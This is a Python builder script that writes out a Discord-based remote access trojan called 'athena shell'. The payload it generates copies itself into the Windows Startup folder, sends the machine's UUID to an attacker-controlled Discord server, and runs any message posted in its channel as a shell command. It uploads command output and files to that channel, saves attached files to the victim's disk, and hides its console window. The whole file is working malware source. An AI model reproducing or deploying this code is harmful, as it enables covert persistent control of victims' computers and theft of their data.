import os


payload = '''
import io
import os
import platform
import subprocess
import sys
import shutil

import discord
from discord.ext import commands


current_file_path = os.path.realpath(__file__)
    
filename = os.path.basename(current_file_path)
    
startup_folder_path = os.path.expanduser('~\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup')
    
destination_path = os.path.join(startup_folder_path, filename)
    
shutil.copy2(current_file_path, destination_path)



bot_token = '%bot_token%'
server_id = %guild_id%

category_prefix = 'athena'
channel_prefix = 'athena shell'

TEXT_SIZE_MAX = 1992
CHUNKED_TEXT_SIZE_MAX = 4 * TEXT_SIZE_MAX
TEXT_CHUNK_SIZE = TEXT_SIZE_MAX

FILE_SIZE_MAX = 7864320
CHUNKED_FILE_SIZE_MAX = 4 * FILE_SIZE_MAX
MEGA_SIZE_MAX = 110100480

bot = commands.Bot(command_prefix='.')
channel = None


@bot.event
async def on_ready():
    global channel

    guild = bot.get_guild(server_id)

    category = await create_category(guild)

    channels = guild.text_channels

    channel = await create_channel(category, channels)

    info = await machine_info()

    send_info = await channel.send(embed=info)

    await send_info.pin()



async def create_category(guild):
    category = discord.utils.get(guild.categories, name=category_prefix)

    if not category:
        category = await guild.create_category(category_prefix)

    return category


async def create_channel(category, channels):
    shell_number = await next_channel(channels)

    return await category.create_text_channel(channel_prefix + str(shell_number))


async def next_channel(channels):
    numbers = []
    shell_number = 0

    try:
        for channel in channels:
            name = channel.name

            if channel_prefix in name:
                channel_number = name.split("-")[2]

                if channel_number.isdigit():
                    numbers.append(int(channel_number))

        shell_number = max(numbers) + 1

    except ValueError:
        shell_number = shell_number + 1

    return shell_number


async def machine_info():
    machine_UUID = ""

    if platform.system() == 'Windows':
        get_UUID = str(subprocess.check_output(
            'wmic csproduct get UUID').decode().strip())

        for line in get_UUID:
            UUID = ' '.join(get_UUID.split())
            machine_UUID = UUID[5:]

    elif platform.system() == 'Linux':
        machine_UUID = str(subprocess.check_output(
            ['cat', '/etc/machine-id']).decode().strip())

    elif platform.system() == "Darwin":
        machine_UUID = str(subprocess.check_output(['ioreg',
                                                    '-d2',
                                                    '-c',
                                                    'IOPlatformExpertDevice',
                                                    '|',
                                                    'awk',
                                                    '-F',
                                                    "'/IOPlatformUUID/{print $(NF-1)}'"]))

    else:
        machine_UUID = str('Unknown')

    embedded = discord.Embed(title='Machine Info', type='rich')
    embedded.add_field(name='Operating System', value=platform.system())
    embedded.add_field(name='UUID', value=machine_UUID)

    return embedded


@bot.event
async def on_message(message):
    if message.author.id != bot.user.id:
        await shell_input(message)



async def upload_chunks(filename):
    await channel.send('Splitting your file and uploading the parts, '
                       'standby...')

    with open(filename, 'rb') as file:
        chunk = file.read(FILE_SIZE_MAX)

        i = 1
        while chunk:
            uploadname = f'{filename}-{i}'

            await channel.send(f'Uploading part `{i}` of the file as '
                               f'`{uploadname}`, standby...')
            await channel.send(file=discord.File(io.BytesIO(chunk),
                                                 filename=uploadname))

            chunk = file.read(FILE_SIZE_MAX)
            i += 1





async def download(message, file):
    await message.attachments[0].save(f'{file}')


async def upload_chunks_from_memory(data):
    await channel.send('Splitting output and uploading chunks as '
                       'files, standby...')

    data = [data[i:i + FILE_SIZE_MAX]
            for i in range(0, len(data), FILE_SIZE_MAX)]

    i = 1

    for chunk in data:
        uploadname = f'output-{i}.txt'

        await channel.send(f'Uploading part `{i}` of the output as '
                           f'`{uploadname}`, standby...')
        await channel.send(file=discord.File(io.BytesIO(chunk),
                                             filename=uploadname))

async def upload_from_memory(data, n):
    if n <= FILE_SIZE_MAX:

        filename = 'output.txt'
        await channel.send('Output is too large. As a result, '
                           f'your output will be sent as `{filename}`.')
        await channel.send(file=discord.File(io.BytesIO(data),
                                             filename=filename))

    elif n <= CHUNKED_FILE_SIZE_MAX:
        await upload_chunks_from_memory(data)


async def handle_user_input(content):
    user_input = ""

    try:
        user_input = os.popen(content).read()

    except:
        await channel.send('Error reading command output.')
        return

    if user_input == '':
        await channel.send('The command did not return anything.')
        return

    paginator = discord.ext.commands.Paginator(prefix="```",
                                               suffix="```")

    output_length = len(user_input)

    if '`' in user_input:
        await channel.send('Output contains an illegal character. As' 
                           'a result, the output will be sent as file.')
        await upload_from_memory(user_input.encode('utf-8', 'ignore'),
                                 output_length)
        return


    if 0 < output_length <= CHUNKED_TEXT_SIZE_MAX:
        user_input = [user_input[i:i+TEXT_SIZE_MAX]
                      for i in range(0, output_length, TEXT_SIZE_MAX)]

        for page in user_input:
            paginator.add_line(page)

        for page in paginator.pages:
            await channel.send(f'{page}')

    elif CHUNKED_TEXT_SIZE_MAX < output_length <= CHUNKED_FILE_SIZE_MAX:
        await upload_from_memory(user_input.encode('utf-8', 'ignore'),
                                 output_length)

    elif output_length > CHUNKED_FILE_SIZE_MAX:
        await channel.send('Output size is too big. If you are '
                           'trying to read a file, try uploading it.')

    else:
        await channel.send('Unknown error.')


async def shell_input(message):
    if message.channel != channel:
        return


    elif message.content.startswith('cd'):
        os.chdir(message.content.split(' ')[1])


        await channel.send('`cd` complete.')

    elif message.content.startswith('shell_exit'):
        sys.exit(0)

    elif message.content.startswith('shell_delete'):
        await channel.delete()

        sys.exit(0)

    else:
        await handle_user_input(message.content)


if platform.system() == 'Windows':
    import win32gui
    import win32.lib.win32con as win32con

    foreground_window = win32gui.GetForegroundWindow()
    window_title  = win32gui.GetWindowText(foreground_window)

    if window_title.endswith('msdtc.exe'):
        win32gui.ShowWindow(foreground_window, win32con.SW_HIDE)


bot.run(bot_token)
'''

file = open('built.pyw', 'a')

with open('built.pyw', 'r+') as file:
    file.truncate(0)

file = open('built.pyw', 'w')

file.write(payload)

os.close(0)